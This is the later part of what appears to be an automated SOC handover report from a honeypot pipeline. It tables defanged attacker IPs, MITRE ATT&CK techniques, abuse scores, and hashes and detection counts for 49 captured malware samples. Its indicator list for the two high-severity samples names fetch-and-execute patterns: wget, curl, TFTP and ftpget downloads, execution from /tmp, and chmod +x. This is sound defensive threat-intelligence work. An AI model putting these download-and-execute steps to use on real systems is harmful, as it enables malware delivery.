| `111.29.38[.]32` | 1 | 2026-08-08 11:12 | 2026-08-08 11:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-08-08 11:13 | 2026-08-08 11:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.92[.]35` | 1 | 2026-08-08 12:16 | 2026-08-08 12:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.22.80[.]11` | 1 | 2026-08-08 12:42 | 2026-08-08 12:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-08-08 12:40 | 2026-08-08 12:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.19.6[.]121` | 1 | 2026-08-08 11:55 | 2026-08-08 11:56 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-08-08 11:20 | 2026-08-08 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-08-08 12:44 | 2026-08-08 12:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.95.73[.]31` | 1 | 2026-08-08 11:11 | 2026-08-08 11:11 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.183.173[.]130` | 1 | 2026-08-08 11:42 | 2026-08-08 11:42 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-08-08 12:36 | 2026-08-08 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.255.181[.]141` | 1 | 2026-08-08 12:13 | 2026-08-08 12:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.187.121[.]21` | 1 | 2026-08-08 11:49 | 2026-08-08 11:49 | 11s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-08-08 11:34 | 2026-08-08 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.105.180[.]137` | 1 | 2026-08-08 12:02 | 2026-08-08 12:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-08-08 11:22 | 2026-08-08 11:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-08-08 12:43 | 2026-08-08 12:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-08 10:55 | 2026-08-08 10:55 | 46s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.223.18[.]188` | DE | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `202.72.196[.]75` | ID | PT Multidata Rancana Prima | **100** ⚠️ | 50 |
| `185.255.212[.]178` | BG | BG-KARNOBATNET | **100** ⚠️ | 50 |
| `65.20.202[.]4` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `37.25.36[.]197` | IL | Pelephone Communications Ltd. | **100** ⚠️ | 50 |
| `176.10.203[.]54` | SE | Bahnhof AB | **100** ⚠️ | 50 |
| `103.251.143[.]14` | IN | Fusionnet Web Services Limited | **100** ⚠️ | 50 |
| `189.56.0[.]19` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `101.13.5[.]50` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 41 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 39 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 120 cases |
| Tool 34  | Credential Extractor        | ✅ 56 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (17.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 41 priority case(s) shown individually · 27 recon entry/entries in table (9 group(s) consolidating 40 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T14:35:53Z_
